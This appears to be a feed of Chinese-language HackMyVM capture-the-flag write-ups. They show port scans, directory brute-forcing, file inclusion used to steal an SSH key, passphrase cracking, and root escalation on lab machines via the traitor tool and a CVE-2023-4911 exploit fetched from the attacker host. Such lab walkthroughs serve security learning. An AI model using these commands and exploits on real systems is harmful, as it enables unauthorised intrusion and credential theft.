uid=1000(angela) gid=1000(angela) groups=1000(angela)
```

继续提权

```bash
angela@pipy:~$ ls -la
total 40
drwxr-x--- 6 angela angela 4096 Oct 17  2023 .
drwxr-xr-x 3 root   root   4096 Oct  4  2023 ..
lrwxrwxrwx 1 angela angela    9 Oct 17  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc
drwx------ 3 angela angela 4096 Oct  5  2023 .cache
drwxrwxr-x 3 angela angela 4096 Oct  3  2023 .local
-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile
drwx------ 3 angela angela 4096 Oct  3  2023 snap
drwx------ 2 angela angela 4096 Oct  2  2023 .ssh
-rw-r--r-- 1 angela angela    0 Oct  2  2023 .sudo_as_admin_successful
-rw------- 1 angela angela   33 Oct  5  2023 user.txt
angela@pipy:~$ cd /opt/
angela@pipy:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/opt$ cd /tmp/
angela@pipy:/tmp$ ls -al
total 12
drwxrwxrwt  2 root     root     4096 Jan 18 02:44 .
drwxr-xr-x 19 root     root     4096 Oct  2  2023 ..
-rw-------  1 www-data www-data   19 Jan 18 02:44 phpMHrr6q
angela@pipy:/tmp$ cd /mnt/
angela@pipy:/mnt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/mnt$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/pkexec
/snap/snapd/23545/usr/lib/snapd/snap-confine
/snap/snapd/20092/usr/lib/snapd/snap-confine
/snap/core20/2434/usr/bin/chfn
/snap/core20/2434/usr/bin/chsh
/snap/core20/2434/usr/bin/gpasswd
/snap/core20/2434/usr/bin/mount
/snap/core20/2434/usr/bin/newgrp
/snap/core20/2434/usr/bin/passwd
/snap/core20/2434/usr/bin/su
/snap/core20/2434/usr/bin/sudo
/snap/core20/2434/usr/bin/umount
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2434/usr/lib/openssh/ssh-keysign
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core/17200/bin/mount
/snap/core/17200/bin/ping
/snap/core/17200/bin/ping6
/snap/core/17200/bin/su
/snap/core/17200/bin/umount
/snap/core/17200/usr/bin/chfn
/snap/core/17200/usr/bin/chsh
/snap/core/17200/usr/bin/gpasswd
/snap/core/17200/usr/bin/newgrp
/snap/core/17200/usr/bin/passwd
/snap/core/17200/usr/bin/sudo
/snap/core/17200/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/17200/usr/lib/openssh/ssh-keysign
/snap/core/17200/usr/lib/snapd/snap-confine
/snap/core/17200/usr/sbin/pppd
/snap/core/16202/bin/mount
/snap/core/16202/bin/ping
/snap/core/16202/bin/ping6
/snap/core/16202/bin/su
/snap/core/16202/bin/umount
/snap/core/16202/usr/bin/chfn
/snap/core/16202/usr/bin/chsh
/snap/core/16202/usr/bin/gpasswd
/snap/core/16202/usr/bin/newgrp
/snap/core/16202/usr/bin/passwd
/snap/core/16202/usr/bin/sudo
/snap/core/16202/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/16202/usr/lib/openssh/ssh-keysign
/snap/core/16202/usr/lib/snapd/snap-confine
/snap/core/16202/usr/sbin/pppd
angela@pipy:/mnt$ /sbin/getcap -r / 2&gt;/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
angela@pipy:/mnt$ ss -tuln | grep tcp
tcp   LISTEN 0      80                  127.0.0.1:3306      0.0.0.0:*        
tcp   LISTEN 0      4096            127.0.0.53%lo:53        0.0.0.0:*        
tcp   LISTEN 0      128                   0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      1024                127.0.0.1:4226      0.0.0.0:*        
tcp   LISTEN 0      511                         *:80              *:*        
tcp   LISTEN 0      128                      [::]:22           [::]:*        
angela@pipy:/mnt$ nc
nc          nc.openbsd  
angela@pipy:/mnt$ nc 127.0.0.1 4226
a
hello
root
angela@pipy:/mnt$ ls
angela@pipy:/mnt$ nc 127.0.0.1 4226
root
admin
```

什么都没找到,还没定时任务，不会是**内核提权**吧，尝试一下可不可以使用自动化工具提权

```bash
angela@pipy:/mnt$ cd /tmp/
angela@pipy:/tmp$ wget 192.168.205.141/traitor-386
--2025-01-18 02:52:07--  http://192.168.205.141/traitor-386
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8475976 (8.1M) [application/octet-stream]
Saving to: ‘traitor-386’

traitor-386                                                  0%[                                                                       traitor-386                                                100%[========================================================================================================================================&gt;]   8.08M  --.-KB/s    in 0.03s   

2025-01-18 02:52:07 (282 MB/s) - ‘traitor-386’ saved [8475976/8475976]

angela@pipy:/tmp$ chmod +x traitor-386 
angela@pipy:/tmp$ ./traitor-386 -a

                                                                                                                                     
▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                            
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                    
https://github.com/liamg/traitor                                                                                                     
                                                                                                                                     
[+] Assessing machine state...                                                                                                       
[+] Checking for opportunities...
[+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
[+][kernel:CVE-2022-0847] Opportunity found, trying to exploit it...
[+][kernel:CVE-2022-0847] Attempting to set root password...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][kernel:CVE-2022-0847] Starting shell...
[+][kernel:CVE-2022-0847] Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored.
[+][kernel:CVE-2022-0847] Setting up tty...
[+][kernel:CVE-2022-0847] Attempting authentication as root...
[+][kernel:CVE-2022-0847] Restoring contents of /etc/passwd...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][error] Exploit failed: invalid password
[+] Continuing to look for opportunities
[+] Nothing found to exploit.
```

不可以，那还是我们自己找吧

```bash
angela@pipy:/tmp$ uname -a
Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
angela@pipy:/tmp$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

找一下，发现**[CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)**可以，但是要用特定的脚本，有些脚本不行

```bash
#kali
┌──(kali㉿kali)-[~/test/tmp]
└─$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
┌──(kali㉿kali)-[~/test/tmp]
└─$ python3 -m http.server 80                                                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
#靶机
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:17--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... failed: Connection refused.
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:25--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3044 (3.0K) [application/octet-stream]
Saving to: ‘main.zip’

main.zip                                                   0%[                                                                       main.zip.1                                                 100%[========================================================================================================================================&gt;]   2.97K  --.-KB/s    in 0s    

2025-01-18 03:06:25 (21.8 MB/s) - ‘main.zip’ saved [3044/3044]

angela@pipy:/tmp$ unzip main.zip
Archive:  main.zip
acf0d3a8bd4c437475a7c4c83f5790e53e8103cb
   creating: CVE-2023-4911-main/
  inflating: CVE-2023-4911-main/Makefile  
  inflating: CVE-2023-4911-main/README.md  
  inflating: CVE-2023-4911-main/exp.c  
  inflating: CVE-2023-4911-main/gen_libc.py  
angela@pipy:/tmp$ cd CVE-2023-4911-main/
angela@pipy:/tmp/CVE-2023-4911-main$ make
gcc -o exp exp.c
python3 gen_libc.py
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
./exp
try 100
# id
uid=0(root) gid=0(root) groups=0(root),1000(angela)

```。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Pipy.html</guid><pubDate>Fri, 27 Jun 2025 09:33:28 +0000</pubDate></item><item><title>hmv_oliva</title><link>https://7r1UMPHK.github.io/post/hmv_oliva.html</link><description># hmv_oliva

# 0. 简介

**靶机**：[hackmyvm - oliva](https://hackmyvm.eu/machines/machine.php?vm=oliva)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1. 扫描

使用 `nmap` 扫描：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 08:43 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:83:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

扫描结果显示目标开启了 **SSH** (22/tcp) 和 **HTTP** (80/tcp) 服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_oliva.html</guid><pubDate>Fri, 27 Jun 2025 09:33:26 +0000</pubDate></item><item><title>hmv_Minimal</title><link>https://7r1UMPHK.github.io/post/hmv_Minimal.html</link><description># hmv_Minimal

# 0.简介

**靶机**：[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
**难度**：黄色
**目标 IP**：192.168.205.135
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
Nmap scan report for 192.168.205.135
Host is up (0.00054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)

（页面挺简洁）发现一个**登录网页(login.php)**  ，测试了`弱密码、sql注入、万能密码`均无果，没有现成的，我们自己注册一个

![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)

注册完之后，可以把一些商品加入购物车

![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)

当你准备买单的时候，点击`Buy items`会发现，网址出现了变化。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Minimal.html</guid><pubDate>Fri, 27 Jun 2025 09:33:23 +0000</pubDate></item><item><title>hmv_logan2</title><link>https://7r1UMPHK.github.io/post/hmv_logan2.html</link><description># hmv_logan2

# 0.简介

**靶机**：[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)
**难度**：黄色
**目标 IP**：192.168.205.144
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
Nmap scan report for 192.168.205.144
Host is up (0.00045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
3000/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request')%r(GetRequest,1000,'HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n&lt;!
SF:DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'theme-\'&gt;\n&lt;head\x
SF:20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;meta\x20name=\'v
SF:iewport\'\x20content=\'width=device-width,\x20initial-scale=1\'&gt;\n\t&lt;me
SF:ta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edge\'&gt;\n\t&lt;title&gt;
SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link
SF:\x20rel=\'manifest\'\x20href=\'/manifest\.json\'\x20crossorigin=\'use-c
SF:redentials\'&gt;\n\t&lt;meta\x20name=\'theme-color\'\x20content=\'#6cc644\'&gt;\
SF:n\t&lt;meta\x20name=\'author\'\x20content=\'Gitea\x20-\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea\'\x20/&gt;\n\t&lt;meta\x20name=\'description\'\x20conten
SF:t=\'Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
SF:nless')%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request')%r(HTTPOptions,1000,'HTTP/1\.0\x20404\x20Not\x20Found\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'the
SF:me-\'&gt;\n&lt;head\x20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;m
SF:eta\x20name=\'viewport\'\x20content=\'width=device-width,\x20initial-sc
SF:ale=1\'&gt;\n\t&lt;meta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edg
SF:e\'&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link\x20rel=\'manifest\'\x20hre
SF:f=\'/manifest\.json\'\x20crossorigin=\'use-credentials\'&gt;\n\t&lt;meta\x20n
SF:ame=\'theme-color\'\x20content=\'#6cc644\'&gt;\n\t&lt;meta\x20name=\'author\'
SF:\x20content=\'Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\'\x20/
SF:&gt;\n\t&lt;meta\x20name=\'description\'\x20content=\'Gitea\x20\(Git\x20with\
SF:x20a\x20c');
MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds

```

80、3000都是http服务

# 2.踩点

80是欢迎页，有一个脚本。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_logan2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:20 +0000</pubDate></item><item><title>hmv_Leet笔记</title><link>https://7r1UMPHK.github.io/post/hmv_Leet-bi-ji.html</link><description># hmv_Leet笔记

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet

**难度**：&lt;span data-type='text' style='color: var(--b3-font-color8);'&gt;红色&lt;/span&gt;

**目标 IP**：192.168.205.208
**本机 IP**：192.168.205.141

# 1.端口枚举及服务探测

使用 `nmap` 扫描目标 IP 的开放端口：

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.208
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 14:28 CST
Nmap scan report for 192.168.205.208
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)
MAC Address: 08:00:27:39:2C:58 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
```

7777 端口是 Web 服务还是 python3.11.2 的，可能是想考 SSTI，去页面看眼。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Leet-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:33:17 +0000</pubDate></item><item><title>hmv_Immortal</title><link>https://7r1UMPHK.github.io/post/hmv_Immortal.html</link><description># hmv_Immortal

# 0.简介

**靶机**：[hackmyvm - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
**难度**：黄色
**目标 IP**：192.168.205.223
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap` 起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap 192.168.205.223
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 12:20 CST
Nmap scan report for 192.168.205.223
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

没啥好说的，有 ftp 服务先尝试**匿名登录**

---

# 2.踩点

## port 21

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.223     
Connected to 192.168.205.223.
220 (vsFTPd 3.0.3)
Name (192.168.205.223:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||52564|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Feb 27  2024 .
drwxr-xr-x    2 0        115          4096 Feb 27  2024 ..
-rw-r--r--    1 0        0             504 Feb 27  2024 message.txt
226 Directory send OK.
ftp&gt; mget message.txt
mget message.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||10512|)
150 Opening BINARY mode data connection for message.txt (504 bytes).
100% |*****************************************************************************************|   504      825.81 KiB/s    00:00 ETA
226 Transfer complete.
504 bytes received in 00:00 (429.10 KiB/s)
ftp&gt; exit
221 Goodbye.                               
```

查看 message.txt 文件

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat message.txt 
Hey guys!
I made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. 
Now we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. 
They may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! 
Wishing you a long life, David.
  
嘿,伙计们！
经过这么长时间，我做到了。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Immortal.html</guid><pubDate>Fri, 27 Jun 2025 09:33:15 +0000</pubDate></item><item><title>hmv_friendly2</title><link>https://7r1UMPHK.github.io/post/hmv_friendly2.html</link><description># hmv_friendly2

# 0.简介

**靶机**：[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 09:37 CST
Nmap scan report for 192.168.205.138
Host is up (0.00057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds

```

# 2.踩点

![Image](https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606)

尝试爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u 'http://192.168.205.138' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET       91l      262w     2698c http://192.168.205.138/
301      GET        9l       28w      319c http://192.168.205.138/assets =&gt; http://192.168.205.138/assets/
301      GET        9l       28w      318c http://192.168.205.138/tools =&gt; http://192.168.205.138/tools/
200      GET       91l      262w     2698c http://192.168.205.138/index.html
200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
301      GET        9l       28w      328c http://192.168.205.138/tools/documents =&gt; http://192.168.205.138/tools/documents/
200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
[####################] - 2m    622895/622895  0s      found:13      errors:1      
[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)
```

其中`/tools/`目录，我们比较感兴趣

![Image](https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6)

有一个疑似目录包含路径，我们加上尝试

![Image](https://github.com/user-attachments/assets/07421b64-12cb-4fe0-b6e8-48f94239bddc)

再尝试可不可以使用**PHP 过滤器链**

![Image](https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb)

不行，那我们还是去读它密钥吧

![Image](https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160)

```bash
┌──(kali㉿kali)-[~/test]
└─$ vim id_rsa 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ chmod 600 id_rsa
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh gh0st@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh2john id_rsa &gt; hash                             
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ john hash --show                                   
id_rsa:celtic

1 password hash cracked, 0 left
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh gh0st@192.168.205.138 -i id_rsa                
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ id
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)

```

# 3.提权

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo 'Enter the string to encode:'
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo 'The string cannot be longer than 20 characters.'
  exit 1
fi

# Validate that the string does not contain special characters
if echo '$string' | grep -q '[^[:alnum:] ]'; then
  echo 'The string cannot contain special characters.'
  exit 1
fi

sus1='A-Za-z'
